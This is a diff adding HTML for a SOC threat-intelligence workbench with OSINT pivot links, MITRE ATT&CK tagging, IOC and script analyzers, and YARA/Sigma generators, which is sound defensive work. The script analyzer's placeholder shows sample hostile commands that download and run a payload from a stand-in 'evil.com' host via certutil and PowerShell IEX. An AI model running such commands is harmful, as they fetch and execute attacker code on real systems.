+          <a id="h_intezer" target="_blank"><div class="title">🧬 Intezer Analyze <span class="lock">🔒</span></div><div class="meta" data-meta="h_intezer"></div></a>
+          <a id="h_cyberchef" target="_blank"><div class="title">🧪 CyberChef <span class="lock">🔒</span></div><div class="meta" data-meta="h_cyberchef"></div></a>
+          <a id="h_nitter" target="_blank"><div class="title">🐦 Nitter (Tweets) <span class="lock">🔒</span></div><div class="meta" data-meta="h_nitter"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== USERNAME ===================== -->
+      <div class="tool-section" data-type="username">
+        <div class="section-head"><h2>👤 Username / Account OSINT</h2><div class="pill">Account pivots</div></div>
+        <div class="tool-grid">
+          <a id="usr_namechk" target="_blank"><div class="title">🧾 Namechk <span class="lock">🔒</span></div><div class="meta" data-meta="usr_namechk"></div></a>
+          <a id="usr_whatsmyname" target="_blank"><div class="title">🕵️ WhatsMyName <span class="lock">🔒</span></div><div class="meta" data-meta="usr_whatsmyname"></div></a>
+          <a id="usr_maigret" target="_blank"><div class="title">🔭 Maigret (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="usr_maigret"></div></a>
+          <a id="usr_sherlock" target="_blank"><div class="title">🔍 Sherlock (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="usr_sherlock"></div></a>
+          <a id="usr_socialsearcher" target="_blank"><div class="title">📡 Social Searcher <span class="lock">🔒</span></div><div class="meta" data-meta="usr_socialsearcher"></div></a>
+          <a id="usr_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="usr_dehashed"></div></a>
+          <a id="usr_intelx" target="_blank"><div class="title">📡 IntelX <span class="lock">🔒</span></div><div class="meta" data-meta="usr_intelx"></div></a>
+          <a id="usr_breachdir" target="_blank"><div class="title">🧯 Breach Directory <span class="lock">🔒</span></div><div class="meta" data-meta="usr_breachdir"></div></a>
+          <a id="usr_leakcheck" target="_blank"><div class="title">💧 LeakCheck <span class="lock">🔒</span></div><div class="meta" data-meta="usr_leakcheck"></div></a>
+          <a id="usr_spiderfoot" target="_blank"><div class="title">🕷 SpiderFoot HX <span class="lock">🔒</span></div><div class="meta" data-meta="usr_spiderfoot"></div></a>
+          <a id="usr_github" target="_blank"><div class="title">🐙 GitHub Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_github"></div></a>
+          <a id="usr_twitter" target="_blank"><div class="title">🐦 Twitter / X <span class="lock">🔒</span></div><div class="meta" data-meta="usr_twitter"></div></a>
+          <a id="usr_reddit" target="_blank"><div class="title">🔴 Reddit Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_reddit"></div></a>
+          <a id="usr_tiktok" target="_blank"><div class="title">🎵 TikTok Profile <span class="lock">🔒</span></div><div class="meta" data-meta="usr_tiktok"></div></a>
+          <a id="usr_instagram" target="_blank"><div class="title">📸 Instagram <span class="lock">🔒</span></div><div class="meta" data-meta="usr_instagram"></div></a>
+          <a id="usr_linkedin" target="_blank"><div class="title">💼 LinkedIn Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_linkedin"></div></a>
+          <a id="usr_snapchat" target="_blank"><div class="title">👻 Snapchat <span class="lock">🔒</span></div><div class="meta" data-meta="usr_snapchat"></div></a>
+          <a id="usr_telegram" target="_blank"><div class="title">✈️ Telegram <span class="lock">🔒</span></div><div class="meta" data-meta="usr_telegram"></div></a>
+          <a id="usr_discord" target="_blank"><div class="title">🎮 Discord Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="usr_discord"></div></a>
+          <a id="usr_pastebin" target="_blank"><div class="title">📋 Pastebin Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_pastebin"></div></a>
+          <a id="usr_nitter" target="_blank"><div class="title">🐦 Nitter Search <span class="lock">🔒</span></div><div class="meta" data-meta="usr_nitter"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== PHONE ===================== -->
+      <div class="tool-section" data-type="phone">
+        <div class="section-head"><h2>📞 Phone Number OSINT</h2><div class="pill">Phone pivots</div></div>
+        <div class="tool-grid">
+          <a id="ph_truecaller" target="_blank"><div class="title">📞 Truecaller <span class="lock">🔒</span></div><div class="meta" data-meta="ph_truecaller"></div></a>
+          <a id="ph_numverify" target="_blank"><div class="title">🔢 NumVerify <span class="lock">🔒</span></div><div class="meta" data-meta="ph_numverify"></div></a>
+          <a id="ph_phoneinfoga" target="_blank"><div class="title">🕵️ PhoneInfoga (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="ph_phoneinfoga"></div></a>
+          <a id="ph_eyecon" target="_blank"><div class="title">👁 Eyecon Caller ID <span class="lock">🔒</span></div><div class="meta" data-meta="ph_eyecon"></div></a>
+          <a id="ph_calleridtest" target="_blank"><div class="title">🆔 CallerID Test <span class="lock">🔒</span></div><div class="meta" data-meta="ph_calleridtest"></div></a>
+          <a id="ph_intelx" target="_blank"><div class="title">📡 IntelX Search <span class="lock">🔒</span></div><div class="meta" data-meta="ph_intelx"></div></a>
+          <a id="ph_dehashed" target="_blank"><div class="title">🗝 Dehashed <span class="lock">🔒</span></div><div class="meta" data-meta="ph_dehashed"></div></a>
+          <a id="ph_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="ph_google"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== MAC ADDRESS ===================== -->
+      <div class="tool-section" data-type="mac">
+        <div class="section-head"><h2>🖧 MAC Address Lookup</h2><div class="pill">Hardware pivots</div></div>
+        <div class="tool-grid">
+          <a id="mac_macvendors" target="_blank"><div class="title">🏭 MAC Vendors <span class="lock">🔒</span></div><div class="meta" data-meta="mac_macvendors"></div></a>
+          <a id="mac_maclookup" target="_blank"><div class="title">🔍 MAC Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="mac_maclookup"></div></a>
+          <a id="mac_wireshark_oui" target="_blank"><div class="title">🦈 Wireshark OUI DB <span class="lock">🔒</span></div><div class="meta" data-meta="mac_wireshark_oui"></div></a>
+          <a id="mac_google" target="_blank"><div class="title">🔎 Google OUI Search <span class="lock">🔒</span></div><div class="meta" data-meta="mac_google"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== ASN ===================== -->
+      <div class="tool-section" data-type="asn">
+        <div class="section-head"><h2>🌐 ASN / BGP Lookup</h2><div class="pill">Network pivots</div></div>
+        <div class="tool-grid">
+          <a id="asn_bgphe" target="_blank"><div class="title">🌐 BGP.he.net <span class="lock">🔒</span></div><div class="meta" data-meta="asn_bgphe"></div></a>
+          <a id="asn_ripestat" target="_blank"><div class="title">🗃 RIPEstat <span class="lock">🔒</span></div><div class="meta" data-meta="asn_ripestat"></div></a>
+          <a id="asn_asnlookup" target="_blank"><div class="title">🔭 ASN Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="asn_asnlookup"></div></a>
+          <a id="asn_ipinfo" target="_blank"><div class="title">🗺 IPinfo ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_ipinfo"></div></a>
+          <a id="asn_shodan" target="_blank"><div class="title">🛰 Shodan ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_shodan"></div></a>
+          <a id="asn_greynoise" target="_blank"><div class="title">🌫 GreyNoise ASN <span class="lock">🔒</span></div><div class="meta" data-meta="asn_greynoise"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== CRYPTO WALLET ===================== -->
+      <div class="tool-section" data-type="btc">
+        <div class="section-head"><h2>₿ Crypto Wallet Lookup</h2><div class="pill">Blockchain pivots</div></div>
+        <div class="tool-grid">
+          <a id="btc_blockchain" target="_blank"><div class="title">⛓ Blockchain.com <span class="lock">🔒</span></div><div class="meta" data-meta="btc_blockchain"></div></a>
+          <a id="btc_blockchair" target="_blank"><div class="title">🪑 Blockchair <span class="lock">🔒</span></div><div class="meta" data-meta="btc_blockchair"></div></a>
+          <a id="btc_walletexplorer" target="_blank"><div class="title">🔍 WalletExplorer <span class="lock">🔒</span></div><div class="meta" data-meta="btc_walletexplorer"></div></a>
+          <a id="btc_otx" target="_blank"><div class="title">👽 OTX Search <span class="lock">🔒</span></div><div class="meta" data-meta="btc_otx"></div></a>
+          <a id="btc_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="btc_google"></div></a>
+        </div>
+      </div>
+      <div class="tool-section" data-type="eth">
+        <div class="section-head"><h2>Ξ ETH Wallet Lookup</h2><div class="pill">Ethereum pivots</div></div>
+        <div class="tool-grid">
+          <a id="eth_etherscan" target="_blank"><div class="title">🔬 Etherscan <span class="lock">🔒</span></div><div class="meta" data-meta="eth_etherscan"></div></a>
+          <a id="eth_blockchair" target="_blank"><div class="title">🪑 Blockchair ETH <span class="lock">🔒</span></div><div class="meta" data-meta="eth_blockchair"></div></a>
+          <a id="eth_google" target="_blank"><div class="title">🔎 Google Dork <span class="lock">🔒</span></div><div class="meta" data-meta="eth_google"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== CVE LOOKUP ===================== -->
+      <div class="tool-section" data-type="cve">
+        <div class="section-head"><h2>🧷 CVE Lookup</h2><div class="pill">Vulnerability pivots</div></div>
+        <div class="tool-grid">
+          <a id="cve_nvd" target="_blank"><div class="title">📄 NVD (NIST) <span class="lock">🔒</span></div><div class="meta" data-meta="cve_nvd"></div></a>
+          <a id="cve_cveorg" target="_blank"><div class="title">🧾 CVE.org Record <span class="lock">🔒</span></div><div class="meta" data-meta="cve_cveorg"></div></a>
+          <a id="cve_cisa" target="_blank"><div class="title">🧨 CISA KEV (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="cve_cisa"></div></a>
+          <a id="cve_exploitdb" target="_blank"><div class="title">💥 Exploit-DB <span class="lock">🔒</span></div><div class="meta" data-meta="cve_exploitdb"></div></a>
+          <a id="cve_vulners" target="_blank"><div class="title">🧠 Vulners <span class="lock">🔒</span></div><div class="meta" data-meta="cve_vulners"></div></a>
+          <a id="cve_github" target="_blank"><div class="title">🧑‍💻 GitHub PoC Search <span class="lock">🔒</span></div><div class="meta" data-meta="cve_github"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== CVE ↔ KEV / EPSS ===================== -->
+      <div class="tool-section" data-type="cveplus">
+        <div class="section-head"><h2>📊 CVE ↔ KEV / EPSS</h2><div class="pill">Exploitability pivots</div></div>
+        <div class="tool-grid">
+          <a id="cvep_cisa_kev" target="_blank"><div class="title">🧨 CISA KEV Search <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_cisa_kev"></div></a>
+          <a id="cvep_epss" target="_blank"><div class="title">📈 EPSS Lookup <span class="lock">🔒</span></div><div class="meta" data-meta="cvep_epss"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== EMAIL ARTIFACTS ===================== -->
+      <div class="tool-section" data-type="emailartifacts">
+        <div class="section-head"><h2>✉️ Email Artifacts</h2><div class="pill">Message-ID / DKIM / SPF pivots</div></div>
+        <div class="tool-grid">
+          <a id="emart_msgid_search" target="_blank"><div class="title">🔎 Message-ID Search <span class="lock">🔒</span></div><div class="meta" data-meta="emart_msgid_search"></div></a>
+          <a id="emart_dkim_domain" target="_blank"><div class="title">🔐 DKIM Domain Pivot <span class="lock">🔒</span></div><div class="meta" data-meta="emart_dkim_domain"></div></a>
+          <a id="emart_spf_domain" target="_blank"><div class="title">🧾 SPF mailfrom Pivot <span class="lock">🔒</span></div><div class="meta" data-meta="emart_spf_domain"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== LOLBINS ===================== -->
+      <div class="tool-section" data-type="lolbins">
+        <div class="section-head"><h2>🧨 LOLBINS / Living-off-the-land</h2><div class="pill">Binary / command pivots</div></div>
+        <div class="tool-grid">
+          <a id="lb_lolbas" target="_blank"><div class="title">🧰 LOLBAS (Windows) <span class="lock">🔒</span></div><div class="meta" data-meta="lb_lolbas"></div></a>
+          <a id="lb_gtfobins" target="_blank"><div class="title">🧰 GTFOBins (Linux) <span class="lock">🔒</span></div><div class="meta" data-meta="lb_gtfobins"></div></a>
+          <a id="lb_hijacklibs" target="_blank"><div class="title">🧩 HijackLibs <span class="lock">🔒</span></div><div class="meta" data-meta="lb_hijacklibs"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== WINDOWS EVENT ID ===================== -->
+      <div class="tool-section" data-type="eventid">
+        <div class="section-head"><h2>🪟 Windows Event ID Lookup</h2><div class="pill">Event pivots</div></div>
+        <div class="tool-grid">
+          <a id="ev_eventidnet" target="_blank"><div class="title">📚 EventID.net <span class="lock">🔒</span></div><div class="meta" data-meta="ev_eventidnet"></div></a>
+          <a id="ev_mslearn" target="_blank"><div class="title">📘 Microsoft Learn (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="ev_mslearn"></div></a>
+          <a id="ev_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="ev_hackthelogs"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== SYSMON ===================== -->
+      <div class="tool-section" data-type="sysmon">
+        <div class="section-head"><h2>🧾 Windows Logs / Sysmon</h2><div class="pill">Sysmon IDs + docs</div></div>
+        <div class="tool-grid">
+          <a id="sysmon_mslearn" target="_blank"><div class="title">📘 Sysmon Docs (Search) <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_mslearn"></div></a>
+          <a id="sysmon_swift" target="_blank"><div class="title">🧩 SwiftOnSecurity Sysmon Config <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_swift"></div></a>
+          <a id="sysmon_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="sysmon_hackthelogs"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== SOC QUICK PIVOTS ===================== -->
+      <div class="tool-section" data-type="soc">
+        <div class="section-head"><h2>🚨 SOC Quick Pivots</h2><div class="pill">Hunt helpers</div></div>
+        <div class="tool-grid">
+          <a id="soc_ruler" target="_blank"><div class="title">🧿 RULER Project <span class="lock">🔒</span></div><div class="meta" data-meta="soc_ruler"></div></a>
+          <a id="soc_hackthelogs" target="_blank"><div class="title">🧠 HackTheLogs <span class="lock">🔒</span></div><div class="meta" data-meta="soc_hackthelogs"></div></a>
+          <a id="soc_explainshell" target="_blank"><div class="title">🧾 ExplainShell <span class="lock">🔒</span></div><div class="meta" data-meta="soc_explainshell"></div></a>
+          <a id="soc_sigma" target="_blank"><div class="title">📜 Sigma Rules (GitHub) <span class="lock">🔒</span></div><div class="meta" data-meta="soc_sigma"></div></a>
+          <a id="soc_uncoder" target="_blank"><div class="title">⚙️ Uncoder.io (Sigma → SIEM) <span class="lock">🔒</span></div><div class="meta" data-meta="soc_uncoder"></div></a>
+        </div>
+      </div>
+
+      <!-- ===================== MITRE ATT&CK (ALWAYS) ===================== -->
+      <div class="tool-section tool-always">
+        <div class="section-head"><h2>🧩 MITRE ATT&CK Tagging</h2><div class="pill">Auto-suggested + manual tags</div></div>
+        <div id="mitre-suggested" class="mitre-suggested" style="display:none">
+          <div class="mitre-suggested-label">💡 Suggested for this IOC type:</div>
+          <div id="mitre-suggested-tags" class="mitre-suggested-tags"></div>
+        </div>
+        <div id="mitre-panel">
+          <label><input type="checkbox" value="T1595"> T1595 – Active Scanning</label>
+          <label><input type="checkbox" value="T1592"> T1592 – Gather Victim Host Info</label>
+          <label><input type="checkbox" value="T1583"> T1583 – Acquire Infrastructure</label>
+          <label><input type="checkbox" value="T1584"> T1584 – Compromise Infrastructure</label>
+          <label><input type="checkbox" value="T1566"> T1566 – Phishing</label>
+          <label><input type="checkbox" value="T1190"> T1190 – Exploit Public-Facing App</label>
+          <label><input type="checkbox" value="T1078"> T1078 – Valid Accounts</label>
+          <label><input type="checkbox" value="T1133"> T1133 – External Remote Services</label>
+          <label><input type="checkbox" value="T1059"> T1059 – Command & Scripting Interpreter</label>
+          <label><input type="checkbox" value="T1086"> T1086 – PowerShell</label>
+          <label><input type="checkbox" value="T1204"> T1204 – User Execution</label>
+          <label><input type="checkbox" value="T1047"> T1047 – Windows Management Instrumentation</label>
+          <label><input type="checkbox" value="T1053"> T1053 – Scheduled Task / Job</label>
+          <label><input type="checkbox" value="T1547"> T1547 – Boot or Logon Autostart</label>
+          <label><input type="checkbox" value="T1055"> T1055 – Process Injection</label>
+          <label><input type="checkbox" value="T1068"> T1068 – Exploitation for Privilege Escalation</label>
+          <label><input type="checkbox" value="T1027"> T1027 – Obfuscated Files or Info</label>
+          <label><input type="checkbox" value="T1218"> T1218 – Signed Binary Proxy Execution</label>
+          <label><input type="checkbox" value="T1036"> T1036 – Masquerading</label>
+          <label><input type="checkbox" value="T1110"> T1110 – Brute Force</label>
+          <label><input type="checkbox" value="T1003"> T1003 – OS Credential Dumping</label>
+          <label><input type="checkbox" value="T1557"> T1557 – Adversary-in-the-Middle</label>
+          <label><input type="checkbox" value="T1082"> T1082 – System Information Discovery</label>
+          <label><input type="checkbox" value="T1046"> T1046 – Network Service Discovery</label>
+          <label><input type="checkbox" value="T1021"> T1021 – Remote Services</label>
+          <label><input type="checkbox" value="T1114"> T1114 – Email Collection</label>
+          <label><input type="checkbox" value="T1071"> T1071 – Application Layer Protocol</label>
+          <label><input type="checkbox" value="T1095"> T1095 – Non-Application Layer Protocol</label>
+          <label><input type="checkbox" value="T1105"> T1105 – Ingress Tool Transfer</label>
+          <label><input type="checkbox" value="T1041"> T1041 – Exfiltration Over C2 Channel</label>
+          <label><input type="checkbox" value="T1567"> T1567 – Exfiltration Over Web Service</label>
+          <label><input type="checkbox" value="T1486"> T1486 – Data Encrypted for Impact (Ransomware)</label>
+          <label><input type="checkbox" value="T1489"> T1489 – Service Stop</label>
+        </div>
+        <div style="padding:8px 14px 14px; display:flex; gap:10px; flex-wrap:wrap;">
+          <button id="mitre-copy-btn" type="button" style="font-size:12px; padding:7px 12px;">📋 Copy Tagged TTPs</button>
+          <button id="mitre-clear-btn" type="button" style="font-size:12px; padding:7px 12px;">🗑 Clear Tags</button>
+          <a id="mitre-attack-link" href="https://attack.mitre.org/" target="_blank" style="font-size:12px; padding:7px 12px; border:1px solid rgba(56,189,248,0.25); background:linear-gradient(180deg,rgba(56,189,248,0.18),rgba(56,189,248,0.08)); color:var(--text); border-radius:12px; text-decoration:none; font-weight:700;">🔗 Open in ATT&CK Navigator</a>
+        </div>
+      </div>
+    </div><!-- end tab-single -->
+
+    <!-- ===== BULK IOC TAB ===== -->
+    <div id="tab-bulk" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>📋 Bulk IOC Analyzer</h3>
+          <p class="sub">Paste a list of IOCs (IPs, domains, hashes, CVEs, emails — one per line or mixed). The tool will extract, classify, and generate pivot links for all of them.</p>
+        </div>
+        <textarea id="bulk-input" placeholder="Paste IOCs here — one per line or mixed text.&#10;192.168.1.1&#10;malware.example.com&#10;44d88612fea8a8f36de82e1278abb02f&#10;CVE-2021-44228&#10;attacker@evil.com"></textarea>
+        <div class="tools" style="margin-top:10px;">
+          <button id="bulk-analyze-btn" type="button">🔍 Analyze All IOCs</button>
+          <button id="bulk-clear-btn" type="button">🗑 Clear</button>
+          <button id="bulk-copy-btn" type="button">📋 Copy Results</button>
+          <button id="bulk-add-case-btn" type="button">📁 Add All to Case</button>
+        </div>
+        <div id="bulk-status" class="status" style="margin-top:10px;">
+          <span>Paste IOCs above and click Analyze</span><span class="badge">BULK</span>
+        </div>
+      </div>
+      <div id="bulk-results" class="bulk-results"></div>
+    </div>
+
+    <!-- ===== SCRIPT ANALYZER TAB ===== -->
+    <div id="tab-script" class="tab-panel">
+      <div class="sa-mode-bar">
+        <button class="sa-mode-btn active" data-mode="powershell" type="button">⚡ PowerShell</button>
+        <button class="sa-mode-btn" data-mode="cmdline" type="button">🖥 Command Line</button>
+        <button class="sa-mode-btn" data-mode="bash" type="button">🐧 Bash / Shell</button>
+        <button class="sa-mode-btn" data-mode="vbs" type="button">📜 VBScript / WSH</button>
+        <button class="sa-mode-btn" data-mode="js" type="button">🌐 JS / JScript</button>
+        <button class="sa-mode-btn" data-mode="auto" type="button">🤖 Auto-Detect</button>
+      </div>
+      <div class="input-panel" style="margin-top:12px;">
+        <div class="sa-input-header">
+          <div>
+            <h3 style="margin:0 0 4px;font-size:15px;">⚡ Script / Command Analyzer</h3>
+            <p style="margin:0;font-size:12px;color:var(--muted);">Paste any PowerShell, CMD, Bash, VBScript, or JS snippet — the analyzer will decode, flag threats, map MITRE TTPs, and extract IOCs.</p>
+          </div>
+          <div class="sa-actions">
+            <button id="sa-analyze-btn" type="button">🔍 Analyze</button>
+            <button id="sa-clear-btn" type="button">🗑 Clear</button>
+            <button id="sa-copy-btn" type="button">📋 Copy Report</button>
+            <button id="sa-decode-btn" type="button" title="Attempt to decode all Base64 layers">🔓 Deep Decode</button>
+            <button id="sa-yara-btn" type="button" title="Generate YARA rule from IOCs">📜 Gen YARA</button>
+            <button id="sa-sigma-btn" type="button" title="Generate Sigma rule skeleton">⚡ Gen Sigma</button>
+          </div>
+        </div>
+        <textarea id="sa-input" spellcheck="false" autocomplete="off"
+          placeholder="Paste PowerShell, CMD, Bash, VBScript, JScript or any command-line snippet here...&#10;&#10;Examples:&#10;  powershell -enc JABjACAAPQAgACcA...&#10;  cmd /c certutil -urlcache -f http://evil.com/pay.exe&#10;  IEX (New-Object Net.WebClient).DownloadString('http://...')"></textarea>
+        <div id="sa-status" class="status" style="margin-top:10px;">
+          <span>Paste a script above and click Analyze</span>
+          <span class="badge" id="sa-mode-badge">POWERSHELL</span>
+        </div>
+      </div>
+      <div id="sa-results" class="sa-results"></div>
+    </div>
+
+    <!-- ===== ALERT WRITE-UP TAB ===== -->
+    <div id="tab-writeup" class="tab-panel">
+      <div class="aw-layout">
+        <div class="aw-sidebar">
+          <div class="aw-sidebar-head">🛡 Alert Templates</div>
+          <div class="aw-platform-bar">
+            <button class="aw-plat-btn active" data-plat="all" type="button">All</button>
+            <button class="aw-plat-btn" data-plat="crowdstrike" type="button">CrowdStrike</button>
+            <button class="aw-plat-btn" data-plat="sentinel" type="button">Sentinel</button>
+            <button class="aw-plat-btn" data-plat="splunk" type="button">Splunk</button>
+            <button class="aw-plat-btn" data-plat="defender" type="button">Defender</button>
+            <button class="aw-plat-btn" data-plat="generic" type="button">Generic SOC</button>
+          </div>
+          <div id="aw-template-list" class="aw-template-list"></div>
+        </div>
+        <div class="aw-main">
+          <div id="aw-template-info" class="aw-template-info">
+            <div class="aw-ti-head">
+              <span id="aw-ti-icon">📋</span>
+              <div>
+                <div id="aw-ti-name" style="font-weight:800;font-size:15px;">Select a template</div>
+                <div id="aw-ti-plat" style="font-size:11px;color:var(--muted);margin-top:2px;"></div>
+              </div>
+              <div id="aw-ti-mitre" class="aw-ti-mitre"></div>
+            </div>
+            <div id="aw-ti-desc" style="font-size:12px;color:var(--muted);margin-top:8px;line-height:1.6;"></div>
+          </div>
+          <div id="aw-form" class="aw-form">
+            <div class="aw-form-placeholder">← Pick an alert template to begin</div>
+          </div>
+          <div class="aw-action-bar" id="aw-action-bar" style="display:none">
+            <div class="aw-output-tabs">
+              <button class="aw-out-tab active" data-out="structured" type="button">📄 Full Report</button>
+              <button class="aw-out-tab" data-out="ticket" type="button">🎫 Ticket</button>
+              <button class="aw-out-tab" data-out="exec" type="button">👔 Exec Summary</button>
+            </div>
+            <div class="aw-btns">
+              <button id="aw-generate-btn" type="button">⚡ Generate</button>
+              <button id="aw-copy-btn" type="button">📋 Copy</button>
+              <button id="aw-clear-btn" type="button">🗑 Clear</button>
+            </div>
+          </div>
+          <div id="aw-output" class="aw-output" style="display:none">
+            <pre id="aw-output-text"></pre>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== CASE MANAGER TAB ===== -->
+    <div id="tab-case" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>📁 Case / Investigation Manager</h3>
+          <p class="sub">Organize IOCs into named investigations. Add notes, set status, and export full case reports.</p>
+        </div>
+        <div class="case-controls">
+          <input id="case-name-input" type="text" class="aw-input" placeholder="Case name (e.g. INC-2025-042 – Phishing Campaign)" style="flex:1" />
+          <button id="case-new-btn" type="button">➕ New Case</button>
+          <button id="case-export-btn" type="button">📤 Export Case</button>
+          <button id="case-clear-btn" type="button">🗑 Clear Case</button>
+        </div>
+        <div id="case-status" class="status" style="margin-top:10px;">
+          <span>No active case. Create one above.</span><span class="badge">CASE</span>
+        </div>
+      </div>
+      <div id="case-body" class="case-body"></div>
+    </div>
+
+    <!-- ===== TIMELINE TAB ===== -->
+    <div id="tab-timeline" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>⏱ Attack Timeline Builder</h3>
+          <p class="sub">Plot investigation events chronologically. Add events, reorder them, and export the full timeline for tickets or reports.</p>
+        </div>
+        <div class="timeline-controls">
+          <input id="tl-time-input" type="datetime-local" class="aw-input" style="flex:1" />
+          <input id="tl-event-input" type="text" class="aw-input" placeholder="Event description (e.g. Phishing email received by user@corp.com)" style="flex:2" />
+          <select id="tl-type-select" class="aw-input" style="flex:0.5">
+            <option value="initial">🔴 Initial Access</option>
+            <option value="execution">🟠 Execution</option>
+            <option value="persistence">🟡 Persistence</option>
+            <option value="lateral">🔵 Lateral Movement</option>
+            <option value="exfil">🟣 Exfiltration</option>
+            <option value="discovery">🟢 Discovery</option>
+            <option value="impact">⚫ Impact</option>
+            <option value="other">⚪ Other</option>
+          </select>
+          <button id="tl-add-btn" type="button">➕ Add Event</button>
+        </div>
+        <div class="tools" style="margin-top:10px;">
+          <button id="tl-export-btn" type="button">📤 Export Timeline</button>
+          <button id="tl-clear-btn" type="button">🗑 Clear</button>
+        </div>
+      </div>
+      <div id="timeline-body" class="timeline-body"></div>
+    </div>
+
+    <!-- ===== HASH FILE TAB ===== -->
+    <div id="tab-hashfile" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>🔑 Hash File (Client-Side)</h3>
+          <p class="sub">Drag &amp; drop or select a file to compute MD5 / SHA-1 / SHA-256 locally in your browser. <strong>No file is uploaded anywhere.</strong> Hash is then auto-pivoted to all threat intel tools.</p>
+        </div>
+        <div id="hash-dropzone" class="hash-dropzone">
+          <div class="hash-drop-inner">
+            <div style="font-size:3rem">📂</div>
+            <div style="font-weight:700;font-size:15px;margin:8px 0 4px">Drop file here or click to select</div>
+            <div style="font-size:12px;color:var(--muted)">File never leaves your browser — hashes computed locally</div>
+            <input id="hash-file-input" type="file" style="display:none" />
+          </div>
+        </div>
+        <div id="hash-results" class="hash-results" style="display:none"></div>
+      </div>
+    </div>
+
+    <!-- ===== DEFANG / REFANG BULK TAB ===== -->
+    <div id="tab-defangbulk" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>🛡 Bulk Defang / Refang</h3>
+          <p class="sub">Paste any report, email body, or IOC list. Get a clean defanged or refanged version with a diff view showing every change made.</p>
+        </div>
+        <div class="defang-layout">
+          <div class="defang-pane">
+            <div class="defang-pane-head">📥 Input</div>
+            <textarea id="dfb-input" spellcheck="false" placeholder="Paste text, IOCs, or full report here..."></textarea>
+          </div>
+          <div class="defang-pane">
+            <div class="defang-pane-head">📤 Output</div>
+            <textarea id="dfb-output" spellcheck="false" readonly placeholder="Result will appear here..."></textarea>
+          </div>
+        </div>
+        <div class="tools" style="margin-top:12px;">
+          <button id="dfb-defang-btn" type="button">🛡 Defang All</button>
+          <button id="dfb-refang-btn" type="button">🔓 Refang All</button>
+          <button id="dfb-copy-btn" type="button">📋 Copy Output</button>
+          <button id="dfb-clear-btn" type="button">🗑 Clear</button>
+        </div>
+        <div id="dfb-diff" class="dfb-diff" style="display:none"></div>
+      </div>
+    </div>
+
+    <!-- ===== YARA / SIGMA TAB ===== -->
+    <div id="tab-yara" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>📜 YARA &amp; Sigma Rule Generator</h3>
+          <p class="sub">Generate YARA rule skeletons from hashes / strings, and Sigma rule YAML from IOC types and MITRE TTPs. Edit and export for use in your SIEM or AV platform.</p>
+        </div>
+        <div class="yara-tabs">
+          <button class="yara-tab-btn active" data-ytab="yara" type="button">📜 YARA Rule</button>
+          <button class="yara-tab-btn" data-ytab="sigma" type="button">⚡ Sigma Rule</button>
+        </div>
+
+        <!-- YARA Panel -->
+        <div id="yara-panel" class="yara-panel">
+          <div class="yara-form">
+            <input id="yara-rulename" class="aw-input" type="text" placeholder="Rule name (e.g. MAL_Cobalt_Strike_Beacon)" />
+            <input id="yara-author" class="aw-input" type="text" placeholder="Author" />
+            <input id="yara-hashes" class="aw-input" type="text" placeholder="Hashes (comma-separated MD5/SHA256)" />
+            <input id="yara-strings" class="aw-input" type="text" placeholder='Suspicious strings (comma-separated, e.g. "MZ\x90","/c powershell")' />
+            <input id="yara-urls" class="aw-input" type="text" placeholder="C2 URLs / domains (comma-separated)" />
+            <textarea id="yara-notes" class="aw-input aw-textarea" rows="2" placeholder="Description / notes..."></textarea>
+          </div>
+          <div class="tools" style="margin-top:10px;">
+            <button id="yara-gen-btn" type="button">⚡ Generate YARA</button>
+            <button id="yara-copy-btn" type="button">📋 Copy</button>
+            <button id="yara-clear-btn" type="button">🗑 Clear</button>
+          </div>
+          <pre id="yara-output" class="rule-output" style="display:none"></pre>
+        </div>
+
+        <!-- Sigma Panel -->
+        <div id="sigma-panel" class="yara-panel" style="display:none">
+          <div class="yara-form">
+            <input id="sigma-title" class="aw-input" type="text" placeholder="Rule title (e.g. Suspicious PowerShell Encoded Command)" />
+            <input id="sigma-author" class="aw-input" type="text" placeholder="Author" />
+            <select id="sigma-logsource" class="aw-input">
+              <option value="windows_process">Windows Process Creation</option>
+              <option value="windows_security">Windows Security Event Log</option>
